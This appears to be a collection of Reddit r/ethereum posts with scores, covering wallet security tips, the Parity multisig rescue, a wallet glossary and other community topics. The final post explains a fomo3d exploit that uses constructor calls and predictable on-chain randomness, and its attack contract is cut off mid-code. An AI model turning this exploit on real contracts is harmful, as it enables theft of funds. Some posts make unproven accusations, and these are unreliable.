i'm very attached to this project, so i hereby wish to announce that i just received the notice that [ethereum stack exchange](https://ethereum.stackexchange.com) is [cleared for final graduation](https://ethereum.meta.stackexchange.com/q/474/87) and immediately dropped beta status. ethereum was one of the fastest ever graduated q&a sites in the stack exchange network (~ 500 days)! **this is a huge milestone**, not only for ethereum stack exchange, but for the whole ethereum community. ethereum joins an elite of 35 technologies which deserve it's own fully-fledged stack exchange q&a site in the network, in one line with communities like [ubuntu](https://askubuntu.com/), [latex](https://tex.stackexchange.com/), [blender](https://blender.stackexchange.com/), [mathematica](https://mathematica.stackexchange.com/), and [android](https://android.stackexchange.com/) - just to name a few, and not to forget joining one network with popular sites like [stack overflow](https://stackoverflow.com/), [super user](https://superuser.com/), and [server fault](https://serverfault.com/). i would like to thank the stack exchange team for giving us the chance to field-test the site with a private and public beta, roman mandeleil for proposing ethereum at [area51](https://area51.stackexchange.com/proposals/89704/ethereum), hudson jameson & joris bontje & _eth_ for moderating the site, and all the users contributing questions, answers, tags, wikis, votes, flags, and everything else! thank for making this possible! **but, huh, what does that mean?** the final graduation will be [fulfilled in two steps](https://meta.stackexchange.com/questions/260754/). the first one, basically removing the beta logo and immediately enabling the following features: - **moderator elections**: community members can nominate and vote on new site moderators (finally, this was needed so badly, really! :) - **community ads**: community members can propose free advertisements for non-profit and/or open-source projects in the ethereum ecosystem which will be visible on the site - **network effect**: a link to ethereum stack exchange will appear in any footer of all sites across the stack exchange network the second step, which might take a while, based on the availability of the design team of stack exchange includes: - **custom site theme**: the site will get an unique ethereum-styled theme (uh-oh!) - **reputation adjustments**: privileges will be adjusted to higher levels of reputation please, if you are feeling happy today, cheer with us on [_meta_](https://ethereum.meta.stackexchange.com/), if you don't have an account yet, feel free to [explore the site first](https://ethereum.stackexchange.com/tour), and if you have any questions, ask me anything! --- **update**: if you want to run for moderator in the graduation elections 2017, please [follow this thread](https://ethereum.meta.stackexchange.com/questions/477/2017-graduation-moderator-election-qa-question-collection) and [here are the first elections](https://ethereum.stackexchange.com/election/1). --- **update**: using the traction of this post to ask - if someone knows _comandantecheth_, please, [send him this way](https://ethereum.meta.stackexchange.com/questions/450/bump-for-google-code-prettify-lets-get-this-done). :)	1
over the last week, using [blockchain based signaling](https://etherscan.io/address/0x3abe5285ed57c8b028d62d30c456ca9eb3e74105#code) and manual sends over skype calls, we returned ~98% of the funds. today we returned that last 2%. every multisig that [signaled using our smart contract](https://www.reddit.com/r/ethereum/comments/6p4luj/rescued_multisig_owners_can_use_a_smart_contract/) had their funds returned to the requested return address. the multisigs that did not signal had their ether and tokens sent to their [whg deployed multisigs](https://www.reddit.com/r/ethereum/comments/6owvor/the_replacement_multisig_wallets_have_been/) which have been [tested and bug bountied all week by the parity team and the community at large](https://blog.parity.io/security-update/). you can see all of our sends [on etherscan](https://etherscan.io/address/0x1dba1131000664b884a1ba238464159892252d3a). it is worth noting that this address contained funds when the rescue mission began, and received funds during the operation. you can also see a summary of all of our transactions in [this csv file on github](https://github.com/giveth/whgbalanceverification/blob/master/whgmultisigreturntxs.csv). **the other white hat!** we worked closely with the [other white hat](https://www.ethnews.com/meet-the-unknown-maverick-white-hat-who-rescued-accounts-missed-by-the-whg-during-this-weeks-attack), who also returned the balance of his rescued funds today. you can see all of his work on etherscan [here](https://etherscan.io/address/0xd1f27c48b948d49f3d098f499b8a1830d8a7e229) and [here](https://etherscan.io/address/0x1ff21eca1c3ba96ed53783ab9c92ffbf77862584). his transactions are also included in the [csv file](https://github.com/giveth/whgbalanceverification/blob/master/whgmultisigreturntxs.csv) **whg donations** we can not express enough gratitude to the community at large for their participation in helping to recover these funds. this operation was aided directly by over 30 people and indirectly by countless others. many people have requested/demanded a donation address so we created a donation account following the [giveth](http://giveth.io/) model, which generates a white hat donation token when it receives ether. our donations address is `whitehats.eth` which resolves to `0xd556caf704e39fc728058557a113b226207d2212` it requires a `gaslimit` of 155,000 gas. half of the donations will go to the 30+ people involved in helping in this specific action, these people will receive non-transferable whg tokens which will be used to collect their portion of the donations from a withdraw contract once we can test it and obtain everyone’s account addresses. the other half of the donations will go to a white hat fund to support smart contract security and future white hat actions, while also acting as a legal contingency fund. **sadly not everyone was saved** there were at least two other addresses that utilized this exploit but have not stepped forward to return the funds as far as we know, [the original hacker](https://etherscan.io/address/0xb3764761e297d6f121e79c32a65829cd1ddb4d32) that drained the [swarm city](https://press.swarm.city/parity-multisig-wallet-exploit-hits-swarm-city-funds-statement-by-the-swarm-city-core-team-d1f3929b4e4e), [aeternity](https://blog.aeternity.com/parity-multisig-wallet-hack-47cc507d964d), and [edgeless](https://medium.com/@tomasdraksas/edgeless-response-to-parity-hack-3e35e20ba85c) multisigs and another [later hacker that was able to grab almost $250k worth of tokens](https://etherscan.io/address/0xdfb692d180cae04bb29b6cd9878ede2ec8e79f45). of the victims, we have stayed in closest contact with swarm city, who alerted us of the exploit in the first place, giving us the head start we needed to preserve the funds that we could. swarm city has [explicitly declined to accept any donations](https://press.swarm.city/follow-up-statement-from-the-swarm-city-core-team-3ab0f1274ad3), saying that if people want to help they can [join their slack](https://slackinvite.swarm.city/) to participate in their efforts to decentralize commerce, and if they still feel compelled to help financially, they can buy their swt token and hold them. this is just one of many stories from the past week that has reaffirmed our faith in the ethereum community. we truly have the best community in crypto, which is what attracted us to the project in the first place. this community has always been and will always be ethereum’s strongest asset. **thank you all!** edit: /u/bokkypoobah, being the white hat that he is, has found several other attackers that have yet to step forward to return the funds. :-( [see his well documented expose on this event](https://github.com/bokkypoobah/paritymultisigrecoveryreconciliation#parity-multisig-recovery-reconciliation) for [the complete list](https://github.com/bokkypoobah/paritymultisigrecoveryreconciliation#attacking-accounts).	1
"[eight months ago eth was ~$13, phishing sites were everywhere, and too many people were losing eth.](https://www.reddit.com/r/ethereum/comments/556frk/its_time_to_get_real_stop_relying_on_third/) today eth is ~$260, bitcoin bloggers, low-entropy phrases, and teamviewer hacks are (not quite) everywhere, but getting more popular, and too many people are losing eth. --- ## how can you protect yourself? 1. **get yourself a ledger or trezor hardware wallet.** they are less than 0.5 eth now and a variety of wallets support them. there is really, really no excuse. https://www.ledgerwallet.com & https://shop.trezor.io/ 2. if you don't want one of these nifty devices, use cold storage for a majority of your savings. please. pretty please. 3. **bookmark your crypto sites.** use those bookmarks and only those. 4. **turn on 2fa for everything.** go do it. right now. quit your excuses. choose google authenticator over authy. don't use your phone number. then, make sure your phone number is not tied to your google account (look in privacy settings). turns out, you and your bff mr. hacker can ""recover"" access to your account via that number, completely destroying the point of 2fa. *ps: don't forget to cold-storage your backup words for these 2fa things. it's a huge pain when your phone goes for a swim and your entire life is 2fa'd.* 😊 4. **do not use cloud storage (dropbox, drive, icloud) for storing your keys** [:(]( https://twitter.com/izqui9/status/872364163330428931)now your keys would only be protected by your cloud storage password. also, see #4. 5. **for token sales: do not trust any address except the one posted on the official site.** bookmark the url before the sale, get the address from the url from your bookmark at time of purchase. do not trust any other source (especially a random bot on slack). *ps: when are token sales going to start using ens names?* 6. **double check the url.** check it. then, check it again right before entering any information. this is especially important for any sites that require usernames, passwords, email addresses, private keys, and any other personal information. ssl certs do not mean a site is trustworthy, just that they bought an ssl cert. not sure about the correct url? *cross reference* reddit, twitter, github, slack and wherever else the project hangs out. 7. **triple check github urls.** these are much easier to fake and much easier to miss. instead of downloading from that random url on reddit, seek out the url on your own. following the developers of these repos on twitter, friending them on reddit (lol...but seriously it's nice because their name will be orange), or starring said repos on github helps. 6. **always verify that the site you landed on is legit.** especially if you are about to entire your private key or download an application. what is legit? a service that people have used for a decent period of time with good results. if the url has been registered in the last week or the site ""just launched"", err on the side of caution and avoid it for a while. 8. **google the service name + ""scam"" or ""reviews"".** scam sites rarely last long. value real comments by real people over a random blog. value a *collection* of information over a single source. understand that legit services will likely have a mix of positive and negative reviews over a long period of time. scam sites typically have no one talking about them, everyone yelling about how they got robbed, or the most perfect reviews ever. the latter one is just as red of a flag as the first one. 9. **don't ever run remote-access software (e.g. teamviewer)** ever...but especially not on a computer with keys on them. the number of security holes in these programs is atrocious. you 2fa your entire life, but then let a single string of characters give someone access to your *entire* computer & every account. 😱 10. **don’t click any link regarding anything crypto, money, banking, or a service like dropbox / google drive / gmail in any email ever.** and if the scammy clickbait was simply too irresistible for you, don’t enter any information on the page. 11. **install an adblocker that actually turns off google/bing ads.** i recommend going with [ublock orgin](https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en). if you are already using adblock plus, it does not hide google ads from you. go into your adblock plus settings and uncheck the box that says “allow some non-intrusive advertising”. 12. **don’t click on advertisements.** with or without an adblocker, you should never, ever click on advertisements. 13. **if you have accidentally visited or typed a malicious site, clean out your recent history and autocomplete.** this will prevent you from typing `kra…` and having it autocomplete to the malicious `krakken.com`. 14. **no one is giving you free or discounted eth. even for completing a survey.** 15. **the guys who just finish their token sale don't want to sell you tokens via slack dm.** neither does that smokin' hot 125px x 125px avatar. 16. **lastly: use your brain.** think for a moment. don't assume, ask. don't blindly follow, question. if something doesn't seem right...if you feel like the luckiest fucker on earth...or if you find yourself asking, ""i wonder why i haven't seen this on reddit yet"", there is likely a reason. 👍 ---- ## a note about ethereum chamber scam yesterday as some of you are aware, there was a scam site yesterday that was a clone of myetherwallet.com, but red. i was alerted to it via a facebook message ~5am from a diligent user. that is one of 3 messages i received about it before our tweet went up at 1pm, not including the 5 from our internal team (thank goodness someone realizes our site isn't red!) since that site has come to light, a number of folks have mentioned things like, ""oh yeah i saw it, i figured you guys were just rebranding"" or ""oh weird. yeah i figured it was a scam."" this site, which *i* thought was only a paid cointelgraph blurb at the time, was actually on a large number of bitcoin blogs: podcasts, blogs, news sites, twitter, the works. how does this happen? how do a number of bloggers promote a direct (red) clone of mew, people see it, and no one says anything? *(the fact that all these bloggers & ""news"" organizations gleefully accepted money from a wallet site without googling ""ether wallet"" or ""name of the site"" is a far too angry and long rant, but should not go unnoticed.)* anyways! --- ## while the above post is all about the steps *you* should take to protect yourself, there is another one that is even more important: ## look out for one another scammers thrive because they have victims -- because they know they can throw a stupid website out there and people will click it. stop thinking, ""well, they shouldn't have clicked it"" and start doing what you can to prevent people from making a mistake that will cost them their hard-earned coins. - if you notice something looks like mew, say *""hey, that looks like a clone of mew! i wonder if they've seen it?""* - if you think that github url looks weird but you don't have the time to check, throw a *""hey u sure thats rite url?""* up there. - if that reddit post is an unheard of wallet, leave a comment and report it with a *""??????????""* in the report reason. - if the token sale you are participating it doesn't tell you explicitly when & where their address will be posted, ask them, in public, over and over again. if its not at least 24 hours before the token sale, question that choice, in public, over and over again. - remind people about best practices! if you've been visiting /r/ethereum for more than 3 months, you have 3 months on 25% of the people here. you are a bloody expert now. time to put on your big boy pants: - *""@nooboob remember the address will be posted on their website, not in this slack.""* - *""it looks like this is an okay link, but it's not a good idea to click or install things from a random user on reddit. it could be malware.""* **there needs to be more due diligence everywhere, but this is easier diligence than most. it requires no advance knowledge or skills. you don't even have to be able to write good. stay aware, trust your gut, ask more questions, trust the internet less, and google the fuck out of everything.** stay safe out there. 💖"	1
all i can say is i tried. i mined eth faithfully for the last two years because i believed in ethereum and the dev team. i never sold a single coin. i like a lot of other miners were extremely disappointed in the dev meeting last week by the slap in the face they gave the gpu miners and refused to even consider moving forward with a very small change to stop the asics. all the miners know, but until now, have been unable to prove bitmain has driven both hashrates up and prices down by mining our coins and selling them. well now we have proof as monero difficulty has dropped by 80% since their anti asic fork. we tried guys, so now comes the inevitable switch of miners from eth to xmr which will now leave ethereum vulnerable to bitmain. soon only asics will be mining eth. if you are a miner go to [whattomine.com] (http://www.whattomine.com) and set difficulty and profitability for current. monero is 2x more profitable than ethereum. you had your chance dev team to give the loyalist miners a reason to stay with eth and you laughed at us. we shall see who has the last laugh. *edit: everyone that thinks they can possibly convince people that the community is against a hardfork to prevent asics are sadly mistaken. remember last week vlad took a twitter poll that showed 57% were in favor and only 13% said no. because of this i am pretty sure all the people posting on here against a fork are bitmain hires here to suppress public opinion. [would you support a hard fork that obsceletes eth asics?] (https://twitter.com/vladzamfir/status/979060233430552576)* *for the people that think bitmain just started making asic mining hardware, think again. this chart https://bitinfocharts.com/comparison/monero-hashrate.html shows monero dropped back to almost one year ago hash levels. this tells us that bitmain runs their miners for almost a year before they start releasing to the public. the e3 that bitmain just happened to announce prior to the dev meeting last week was their rev1 version from a year ago. they purposely released a non competitive miner so they could fool the dev team into believing there is no threat. because of the rumors bitmain was forced to show something to prevent the dev team from doing something out of fud. the bitmain team is laughing all the way to the bank as their latest miners are getting close if not surpassing the 51% level.*	1

"x-post from team just discord (they make popular decentralized applications) educational: hey @everyone, we know gas prices are astoundingly high today. let's have a bit of an adventure and find out why shall we? today, 40&#37; of the ethereum's network is being used by this contract [https://etherscan.io/address/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483](https://etherscan.io/address/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483) a beautiful and innovative copy-paste of a default erc20 standard token called ""ifishyunyu"" with no features. (so it does nothing.) yet miraculously, it seems tons of ""unique"" accounts are transferring massive volumes of this token constantly, almost 50 eth of gas an hour have been steadily used for nearly 24 hours now. just to transfer individual tokens to the fcoin exchange. but of course. the exchange is just a red herring to distract you from what's really happening. let's see what the creator of this contract has been up to recently. [https://etherscan.io/tx/0xd0e334dca734071f395cad64df90269113ead321232e5603f66fc6fb2885c654](https://etherscan.io/tx/0xd0e334dca734071f395cad64df90269113ead321232e5603f66fc6fb2885c654) looks like he minted nearly 5 billion ifish tokens about 12 days ago... to this account 0x45f64a7148d1cfeded427dd4380b458877e7ce56 which split it up across 10 or so accounts, that each do this [https://etherscan.io/token/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483?a=0xcd4777b5f4d8779e99ea996bb32988daf0bbbf3b](https://etherscan.io/token/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483?a=0xcd4777b5f4d8779e99ea996bb32988daf0bbbf3b) splitting it up across 500-600 accounts each. which are, the mystery ""unique"" accounts that are spamming the eth network. so yeah, it's one guy, it's the creator of the token. he was doing it during the previous fcoin exchange competition too. he's running a multi-sided scheme, he even has bots running ""wash"" accounts. like [https://etherscan.io/address/0xa67ef2aca4c6459e60821c1b1afe45812c4c1bcd#tokentxns](https://etherscan.io/address/0xa67ef2aca4c6459e60821c1b1afe45812c4c1bcd#tokentxns) which is pretty cool, it just shoves the token into other accounts, and then those accounts shove it into other accounts, and then back to the big main account to simulate volume on the token itself. try following a transaction, you'll come right back to the big-daddy account. most importantly on why is this being done? let's see what one of the accounts funding all this eth might be doing [https://etherscan.io/token/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0?a=0x7a717e226a8b37b912d0effbb0aab24ab690dbdb](https://etherscan.io/token/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0?a=0x7a717e226a8b37b912d0effbb0aab24ab690dbdb) gee, that sure is a lot of crowdfunded eos, hundreds of thousands to be exact. from an account that seems to receive large sums of eos and immediately market sell them for thousands of eth, which is then distributed out to contracts like this. contracts that have been pulling this kind of transaction attack consistently across the eth network.

i'm making a (in-browser webgl) game where you can buy virtual properties on the eth blockchain, build a house on them sims-style and resale them for a, hopefully, higher price. is this something which interests hodlers? you will be able to buy properties, build houses on them or improve existing ones, add furniture, landscaping and vehicles if so desired, then (try to) resale at a higher value. or you can just own virtual properties on the blockchain. of course for this kind of game a certain amount of centralization is still inevitable at this point, as with cryptokitties et al. storing whole house blueprints on the blockchain would currently cost a lot of gas for every transaction. https://i.imgur.com/tk1nyqj.jpg https://i.imgur.com/5sldgh7.jpg a game like this wouldn't be complete without a lambo prop ;) https://i.imgur.com/j61i4jy.jpg there could be two models: 1) the property value acts like a stock, where every buy increases the overall price, and every sale decreases it. 2) you can just set your own sale value (like cryptokitties) and hope to sell higher than that you bought it after customizing the property. what do you think?	1

(it will work for all gdax products) here's exactly how it works: 1) generate **view only** api key (this allows the app to read your completed orders). 2) provide your phone number/carrier (so i can build your contact email i.e 123456790@txt.att.net) 3) the app will make a request every 60 seconds and record the number of completed orders you have in a database. every time it checks, it will see if there's a difference in the numbers. if there is, it will build a message with information from that many of your most recent fills (something like buy: x ticker at $y total: $z) i originally wrote most of the backend python of this a few months ago and i've been running it on my raspberry pi and sending me a text when my limit orders fill. the main reason why i wrote this is because i thought it was something crucial that other services didn't offer, and being a software engineer i could do quite easily. a bunch of my coworkers who were also into trading cryptocurrency on gdax really wanted to use it so initially i was just giving them the code but then i decided that since i've always wanted to have an app under my name on the app store and learn swift, this would be the perfect opportunity. i have all of the code publicly visible on my github [here!](https://github.com/leggio/cointradealerts) the backend api is a flask web server running on an aws ec2 instance. the database is an aws rds mysql database. i've been using flask for about 2 years and i never really thought that it could be practical for ios development. it really surprised me how well it worked. ______________________________________________________________________________ although my code is publicly visible and i am only reading your completed orders, there is obviously a trust level required on your end to give me the api key. nobody here knows who i am and i fully understand that! **if you provide anything more than view only your api key can be used to transfer your money/coins and steal them.** if anyone does not feel comfortable doing so, you are more than welcome to use [the previous version](https://raw.githubusercontent.com/leggio/cryptocurrency/master/fill_tracker.py) of this code and run it locally on your machine. this means that you are entering your api credentials locally on your own machine. i am in the process of building out the website, which will include instructions as to how to do the above, as well as provide the same (and more!) functionality that the app does. the website should come out with the base features in a few days and will allow people who don't have iphones to utilize this tool! ______________________________________________________________________________ **i originally posted about this on /r/litecoin and /r/bitcoin yesterday and received such overwhelming support that it was crashing the backend web server of my application. today i was able to get this sorted out and nobody should experience any problems!** ______________________________________________________________________________ additionally, i received a lot of great feedback from you guys, which is why i spent quite a few hours yesterday/today building a brand new website that will offer the exact same functionality as the mobile app, but in your browser! i plan on deploying in the days to come. i will be adding all user requests to the website as well. what's currently on my todo list: 1) security alerts! i had a phenomenal request from /u//swingvitamin to set up alerts when transfers/instant purchases are made on your account to try and combat account theft. i think this was an awesome idea and i will be working to bring this out asap!	1

i recently created a wallet on myetherwallet.com in which i transferred some coins. some of them i sent to binance and kucoin and some i intended to keep on the wallet. about 12h after the kucoin transfer someone transferred all the remaining coins in the my wallet to another wallet. everytime i made a transaction i did it from my android phone. the private key was kept in a 7zip encrypted archive that was stored on my phone and a backup on a newly created google drive account. i know that the coins are lost forever but please help me understand how they stole in from me so that i don't make the same mistake twice. edit: it was a phishing job guys. i browse through my google history and i discovered that i accessed www. myethierwalliet .com at some point. it's very strange that the transaction went through even though it was a phishing site. the ether address of the thief has a lot of messages from the people that got robbed also. please be very careful everybody, you can lose a lot of money by a simple mistake. thanks a lot to everybody for your help and sugestions.	2

after looking into the eos contract to see how much ether they were actually putting into the market, i stumbled across something quite weird that makes me think eos is a massive money laundering scheme. --- 1. massive amounts of ether sent daily from wallets that only interact with eos contract --- this was the first sign that tipped me off. the following accounts are sending hundreds of thousands of dollars to eos every week. these accounts look like they were created before the contract and have only been used to buy from the contract, then send the funds to different exchanges.

[link to the source on rusbase](https://rb.ru/opinion/buterin-rock-and-roll/) --- in 2017 the ethereum founder vitalik buterin made it to the top ten of the most influential young people according to the fortune magazine. some call him the crypto god, some – a crypto-anarchist, and some just idolize him. any rumor on vitalik affects the ethereum exchange rate and costs or makes the ethereum holders large amounts of money. rusbase attended an open discussion with the rock star of blockchain and got to know what the 23-year-old genius thinks and what happens in the industry. **on himself and ethereum** 1. how did i become interested in blockchain? there was a moment when i realized that this is a very interesting technology with strong mathematics and then i understood that there was a serious concept behind this, a transparency system. a community of several thousand people created their own financial system. this idea is very close to me. i like building something that no one has ever built before. 2. creating ethereum was not a question of money, it was a mission, an idea that you want to follow. 3. in 2011 i learned about bitcoin, and six months later i cofounded a bitcoin magazine [bitcoin magazine – ed.], two years later i was in the university [university of waterloo - ed.] and i was spending 30 hours a week on bitcoin programming tasks. then i dropped out, traveled around, and watched blockchain projects develop in different countries of the world. in israel, usa, europe. 4. the idea to create ethereum was not an immediate one. at first, i pitched it in the project that i worked in. but i was told it'd take a year to complete it. then i quit. i remember walking around san francisco, thinking, and then i just wrote a white paper and sent it to my friends, and they shared it with their friends. and it all started. **on mining** 5. the role of mining will decrease over time. this trend is not promising. 6. mining as a business... this happens when you have your own source of energy or a subsidized source of energy. then this is profitable. but anyway it's better to move towards the blockchain application, not speculation. 7. if you want to invest money, invest it in r&d. **on the blockchain prospects** 8. the first and the biggest blockchain prospect of the blockchain development is the financial one. this is cryptocurrencies, smart contracts, and state registry. for example, now it takes you several weeks to sell a house, whereas it can take just 3 minutes. 9. besides the financial area, i'd say the following areas are prospective: the internet security; the logistics; anything that has to do with identity; a more expensive but also a safer information storage. 10. the advantage of the blockchain is that there is a lot of data in the network that you can use for different purposes. the simplest example is the smart contract that lets you decrease the need for other types of insurance. **on icos** 11. the problem with icos is that someone makes something useful for a very small amount of people. everyone sees now that there is open source software where you can make money easily. the developers now have the option to keep working in the basement or buy a lamborghini. 12. there are now so many projects where the token is absolutely useless and people just want to make a lot of money. 13. the ico concept is too centralized. the problem is that people evaluate the idea and not the team behind it. the investors put their money in the idea and there is no guarantee that the team will actually manage to do it. i think one needs to keep an eye on this and keep investing only if it's successful. and a better way would be to invest in the idea and not a specific team as there should be several teams competing for the investments to implement the idea. 14. the moment will come when the market realizes that many of the tokens that exist today have no value. 15. tokening must have a purpose. the majority of the icos today don't have any backing and will fail. **on the cryptocurrency prospects** 16. i think that the cryptocurrency will not replace money 100% but in 20 to 40 years there's going to be a lot of different cryptocurrencies that will be used together. 17. the number of cryptocurrencies is going to increase. there will be cryptocurrencies for different cities, big companies will issue their own cryptocurrencies, like that burger king case i heard about. 18. in 50 years everyone will have a wallet with 15 different types of cryptocurrency and you will be able to use them to make payments. **on the blockchain security** 19. there is a paradox now. the purpose of the blockchain is security. but the blockchain is a new technology that has security issues. 20. right now you can safely use blockchain where no one will take damage if the blockchain breaks. **on russia** 21. attracting the investments based on blockchain is a very interesting thing for russia, especially when you consider the imposed sanctions. 22. the expertise of the it professionals in russia is high, but there's just not enough of them. 23. no other country has the same degree of the desire to implement the technology. in russia any place you go – everyone discusses the blockchain, everyone is fascinated by it: from the higher officials to the small time entrepreneurs. 24. the blockchain in russia needs smaller successful projects to prove itself. **on the world** 25. the blockchain is a part of the bigger trend. the world is becoming more and more digital. in 50 years people are going to have more friends abroad than in their own country. 26. southeast asia is very technological, but they don't have the same amount of interest as there's here [in russia]. however, people there use qr-codes to sell oranges. **a happy end** 27. the cryptocurrencies are never going to be stable. however, the degree of volatility is going to decrease with the emergence of successful blockchain startups and with the increase in the volume of money in the cryptocurrencies. this will happen in a year or two. 28. the blockchain now is in phase 3. here's what this means: * phase 1: several hacker anarchists become interested in it. * phase 2: putin knows what blockchain is – this is the hype phase. * phase 3: the road from the hype to the real results. people know that the blockchain is an interesting idea. people know how to use it and they are already testing it. however, there's still no application on the big scale. **edit**: i am disappointed that this has become a political discussion, ""russia is bad and corrupt"". make of that what you will. don't let the media brainwash you. russia has many problems just like any other government. this post was meant for the crypto discussion. r/ethereum of all places man"	1
"### wallet - the interface / client / wrapper / holder that you use to manage your account(s). - example: myetherwallet.com, your ledger hardware wallet, a multisig wallet contract. ### account - a public & private keypair that ""holds"" your funds. - your funds are actually stored on the blockchain, not in the wallet or account. - just like your reddit account has a`username (public)` and `password (private)`, so does your ethereum account. for additional security, you can use a password to encrypt your private key which would result in a `username (public)` and `password (private)` and `password for that password (private + more secure)`. see the `keystore file` section. ### address *(""public key"")* - you use this to send funds **to** an account. - sometimes referred to as the ""public key"" - a string made up of `0x` + `40 hexadecimal characters`. - in ethereum, the address begins with `0x`. - example: `0x06a85356dcb5b307096726fb86a78c59d38e08ee` ### public key - in cryptography, you have a keypair: the public and private key. - you can derive a public key from a private key, but cannot derive a private key from a public key. - (advanced) in ethereum, the address ""acts"" like the public key, but it's not actually the public key. - (advanced) in ethereum, the public key is derived from the private key and is 128 hex characters. you then take the `""sha3"" (keccak-256)` hash of this (64 characters), take the last 40 characters, and prefix with `0x`, give you your 42-character address. ### private key - you use this to send funds **from** an account. - the secret half of your address / public key. - a string of 64 hexadecimal characters. - ([almost](https://crypto.stackexchange.com/questions/30269/are-all-possible-ec-private-keys-valid)) every string of 64 hexadecimal characters is a private key. - if you hand-type a private key differently today than yesterday, you will access a different wallet. never hand type your private key. - this is the string you need to send from your account. without it you cannot access your funds. although, you don't need to save this raw, unencrypted private key in this format. you can saving the fancy versions of it (e.g. the keystore file / mnemonic phrase). - example: `afdfd9c3d2095ef696594f6cedcae59e72dcd697e2a7521b1578140422a4f890` ### keystore file - encrypted version of your private key in json format (though it does not have a json extension) - a fancy version of your private key that is protected by a password of your choosing. - when combined with the password, it has the private key. - safer than a private key because you need the password. - file name usually is in the format `utc` + `--` + `date_created` + `--` + `your_address_without_the_ox` - example of file nae: `utc--2017-07-02t20-33-09.177z--06a85356dcb5b307096726fb86a78c59d38e08ee` - example of contents: `{""version"":3,""id"":""aa811d53-fe9a-44a2-bd1c-e737007b5591"",""address"":""06a85356dcb5b307096726fb86a78c59d38e08ee"",""crypto"":{""ciphertext"":""f5a7cc8d4b8cf93510b0d0d057f3a52ac79fd48e619e0638c4ffd978ca180248"",""cipherparams"":{""iv"":""975ab00192e2dd74170e91ca59c0b0bd""},""cipher"":""aes-128-ctr"",""kdf"":""scrypt"",""kdfparams"":{""dklen"":32,""salt"":""0210f0d0b99e440dfbceb36373304638bac093a367ee7da6411cd165f7aa907a"",""n"":1024,""r"":8,""p"":1},""mac"":""8197a747a3855a10546a2ff939c36470daed78e393b670efa0c12fe3b23dd7e3""}}` - (pw: `mypassword`) ### mnemonic phrase - another fancy version of your private key, that is actually used to derive multiple private keys. - a (typically) 12 or 24 word phrase that allows you to access infinite number of accounts. - used by ledger, trezor, metamask, jaxx, and others. - originates from [bip 39 spec](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki). - the accounts you can access with this phrase are determined by the ""path"". - example 12-words: `brain surround have swap horror body response double fire dumb bring hazard` - example 24-words: `card enrich gesture connect kick topple fan body blind engine lemon swarm venue praise addict agent unaware equal bean sing govern income link leg` ### hardware wallet: - typically, a single-purpose device that ""holds"" your private key(s), ensuring your private keys are safe. - typically, they use a 24-word phrase. this phrase you should write down (not on your computer) and store separately from your hardware wallet. - if you lose your hardware wallet, you can still gain access to your accounts & funds via the word-phrase you wrote down. - never type the word-phrase on your computer. it defeats the purpose of your hardware wallet. ### addressidenticon / addressicon: - the colorful blob of colors that corresponds to your address. - it is an easy way to see if your address is correct. - [example 1](http://i.imgur.com/lhuriiz.jpg) - [example 2](http://i.imgur.com/fvylews.jpg) - *note: the above addresses are a single character different but have remarkably different icons & colors. magic!* ### hexadecimal - used all over ethereum for a variety of things, a hexadecimal string is comprised of the numbers `0 1 2 3 4 5 6 7 8 9` and `a b c d e f` ### seed - the input given to derive a private key. this should always be generated in a truly random way, not something you make up with your measly human brain. - if you chose the seed, it is known as a `brain wallet` ### brain wallet - an account generated from a seed or password or passphrase of your choosing. - humans are not capable of generating enough entropy and therefore the wallets derived from these phrases are insecure. - brain wallets can be brute forced by super fast computers. - [brain wallet are insecure.](https://www.reddit.com/r/ethereum/comments/45y8m7/brain_wallets_are_now_generally_shunned_by/) - don't use brain wallets. ### entropy - also known as ""randomness"". - the more random something is, the more entropy it has, and the more secure it is. - usually defined in ""bits of entropy"" or the number of years it would take to brute-force a ________ (e.g. private key) derived with that much entropy. - ethereum private keys are 256-bit keys - 24-word mnemonic phrases are also 256 bits of entropy. 2048 words in the dictionary. 11 bits of entropy (the words). `11 * 24 = 264`. the last word is a checksum. --- ### to do still: ### derive / derivation ### encryption ### encrypted vs unencrypted keys ### ledger ### difference between an exchange or hosted wallet & a wallet you control - [knowledge base article on the subject (wip, too)](https://support.mycrypto.com/getting-started/whats-the-difference-between-an-exchange-and-mycrypto.html) ### node ### client (+ light client) ### dag ### decentralized ### blockchain ### gas (gas limit vs gas price) -

"i found out about fomo3d today and saw that it's an pyramid game holding an insane $12m stash currently. looking through the code, it's multiple contracts totaling thousands of lines of code. let's be honest, $12m inside thousands of lines of solidity... that's asking for it. one thing that immediately caught my eye whilst looking through their code was: modifier ishuman() { address _addr = msg.sender; uint256 _codelength; assembly {_codelength := extcodesize(_addr)} require(_codelength == 0, ""sorry humans only""); _; } ok, lemme rename that. i believe \`ishumanorcontractconstructor\` is a much better name for it. i guess you see where this is going. if the entire fomo3d contract suite is based on the assumption that it can only be called from plain accounts (i.e. you can't execute complex code and can't do reentrancy)... they're going to have a bad time with constructors. we now have our attack vector, but we still need to find a place to use it. i'm sure there are a few places to attempt to break the code, but the second thing that caught my eye was: /** * @dev generates a random number between 0-99 and checks to see if thats * resulted in an airdrop win * @return do we have a winner? */ function airdrop() private view returns(bool) { uint256 seed = uint256(keccak256(abi.encodepacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodepacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodepacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) < airdroptracker_) return(true); else return(false); } oh boy! on chain random number generation... just what we needed! i.e. at this point, we can create transactions that within their constructor can calculate the result of this \`airdrop()\` method, and if it's favorable, can call arbitrary methods on the fomo3d contract (potentially multiple times). looking through the code to see where \`airdrop\` is being used, we can find that that any contribution larger than 0.1 ether gets a chance to win 25% of some ingame stash. and that's the last missing piece of the puzzle. we can create a contract that can 100% win (or not play in the first place). so, here's a full repro (\*\*i didn't test it mind you, just wrote up the pseudocode, it may not be fully functional yet\*\*). pragma solidity ^0.4.24; interface fomo3dlonginterface { function airdroptracker_() external returns (uint256); function airdroppot_() external returns (uint256); function withdraw() external; } contract pwnfomo3d { constructor() public payable { // link up the fomo3d contract and ensure this whole thing is worth it fomo3dlonginterface fomo3d = 